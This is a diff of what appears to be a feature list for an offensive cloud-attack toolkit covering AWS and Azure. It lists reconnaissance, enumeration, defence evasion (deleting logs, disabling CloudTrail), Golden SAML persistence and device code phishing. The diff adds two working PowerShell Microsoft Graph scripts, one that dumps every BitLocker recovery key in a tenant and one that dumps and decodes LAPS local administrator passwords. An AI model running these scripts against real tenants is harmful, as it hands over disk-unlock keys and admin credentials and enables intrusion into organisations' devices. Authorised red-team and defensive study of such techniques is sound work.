@@ -1,37 +1,44 @@
 [*] Reconnaissance
-    reconnaissance/azure_unauth_user_enum (adfs too)
-    reconnaissance/aws_find_ip_category
-    reconnaissance/azure_fuzz_subdomains
     reconnaissance/misc_gitdumper
 
 [*] Enum:
-    enum/get_iam_groups
     https://github.com/prowler-cloud/prowler
     RoadTools
     All Zeus Features: https://github.com/DenizParlak/Zeus
 
 [*] Console
-    https://github.com/NetSPI/aws_consoler
+    https://github.com/NetSPI/aws_consoler (Done)
 
 [*] Exploit
     Device Code Phishing
 
+    Bitlocker Dump: (Get-MgInformationProtectionBitlockerRecoveryKey -All) | ForEach-Object {
+$device = (Get-MgDevice -Filter "deviceId eq '$($_.DeviceId)'").DisplayName
+$key = (Get-MgInformationProtectionBitlockerRecoveryKey -BitlockerRecoveryKeyId $_.Id -Property Key).Key
+[array]$bitlockerReport += "$device,$key"
+}
+$bitlockerReport
+
+    LAPS Dump: Connect-MgGraph -Scopes 'http://DeviceLocalCredential.Read.All'
+
+Get-MgDevice -Filter "OperatingSystem eq 'Windows'" | ForEach-Object {
+[array]$b64 = (Get-MgDirectoryDeviceLocalCredential -DeviceLocalCredentialInfoId $_.DeviceId -Property credentials).credentials.PasswordBase64
+[string]$pw = if (!([string]::IsNullOrEmpty($b64))) { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($b64)[0])) }
+[array]$lapsReport += "$($_.displayName),$pw"
+}
+$lapsReport
+    
 [*] Post Exploitation
     https://github.com/Static-Flow/CloudCopy
     https://github.com/andresriancho/enumerate-iam (like my enumerate iam)
 
 [*] Bypass Defences
     Disable Logging
-        Disable CloudTrail
-        Disable monitoring of events from global services
-        Disable Cloud Trail on specific regions
         Delete logs from Bucket
-    User Agent Change
 
 [*] Persistence
     Golden SAML Attack
     Update AWS key
-    Create 2nd key
 
 [*] Commands
     list_aws_iam_groups
